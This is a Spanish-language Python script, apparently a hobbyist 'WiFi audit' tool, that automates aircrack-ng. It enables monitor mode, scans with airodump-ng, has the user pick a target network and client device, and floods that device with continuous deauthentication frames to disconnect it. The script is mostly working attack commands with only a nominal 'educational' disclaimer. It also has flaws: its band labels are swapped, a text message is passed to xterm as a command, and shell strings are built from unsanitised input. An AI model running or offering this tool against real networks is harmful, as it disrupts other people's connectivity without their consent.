#!/usr/bin/env python3

import os
import subprocess

def ejecutar_comando(comando):
    """Ejecuta un comando en el shell."""
    try:
        subprocess.run(comando, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Error al ejecutar el comando: {comando}")

def abrir_en_ventana(comando, titulo=""):
    """Abre un comando en una ventana separada (xterm)."""
    try:
        subprocess.Popen(f"xterm -hold -T '{titulo}' -e '{comando}'", shell=True)
    except Exception as e:
        print(f"Error al abrir la ventana: {e}")

def main():
    print("=== Script de Auditoría de Redes WiFi ===")
    print("Nota: Este script es exclusivamente para fines educativos. Asegúrate de tener los permisos adecuados.")
    print("Asegúrate de ejecutarlo como administrador.\n")

    # Verificar el nombre de la tarjeta de red
    print("Verificando tarjetas de red disponibles...")
    ejecutar_comando("iwconfig")
    tarjeta_red = input("\nIntroduce el nombre de la tarjeta de red (ejemplo: wlan0): ").strip()

    # Iniciar modo monitor
    print("\nCambiando la tarjeta de red al modo monitor...")
    ejecutar_comando(f"airmon-ng start {tarjeta_red}")

    # Escanear redes disponibles
    print("\nAbriendo escáner de redes en una nueva ventana...")
    abrir_en_ventana(f"airodump-ng --band a {tarjeta_red}", "Escáner de Redes 2.4 GHz")
    abrir_en_ventana(f"airodump-ng --band bg {tarjeta_red}", "Escáner de Redes 5.0 GHz")
    input("\nObserva la ventana del escáner. Cuando tengas el BSSID y el canal de la red (CH) objetivo, vuelve aquí y presiona Enter para continuar.")

    # Solicitar información de la red a auditare
    bssid = input("\nIntroduce el BSSID de la red objetivo: ").strip()
    canal = input("Introduce el canal (CH) de la red objetivo: ").strip()

    # Monitorear la red específica
    print(f"\nAbriendo monitoreo de la red {bssid} en una nueva ventana...")
    abrir_en_ventana(f"airodump-ng --band a -c {canal} --bssid {bssid} {tarjeta_red}", "Monitoreo de Red")
    print("--> Realiza prueba y error con los sigueintes dispositivos hasta encontrar el deseado.")
    input("\nObserva la ventana del monitoreo. Cuando identifiques el dispositivo objetivo anota el STATION, vuelve aquí y presiona Enter para continuar.")

    # Solicitar información del dispositivo objetivo
    station = input("\nIntroduce el STATION (dispositivo objetivo): ").strip()

    # Intentar desautenticar el dispositivo
    print(f"\nEnviando desautenticación al dispositivo {station}...")
    ejecutar_comando(f"aireplay-ng -0 0 -a {bssid} -c {station} {tarjeta_red}")
    abrir_en_ventana("Se esta mandando ping al Dispositivo ingresado, para que pare oprime CTRL + C, y recupera tu conexion estable con el comando airmon-ng stop _____ en el espacio coloca el nombre de la tarjeta de red", "INDICACIONES")

    print("\nSi este no es el dispositivo deseado, reinicia el script y prueba con otro STATION.\n")

    # Detener modo monitor
    print("Deteniendo el modo monitor y restaurando configuración...")
    ejecutar_comando(f"airmon-ng stop {tarjeta_red}")

    print("\n=== Script finalizado ===")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Este script debe ejecutarse como administrador (sudo).")
        exit(1)
    main()
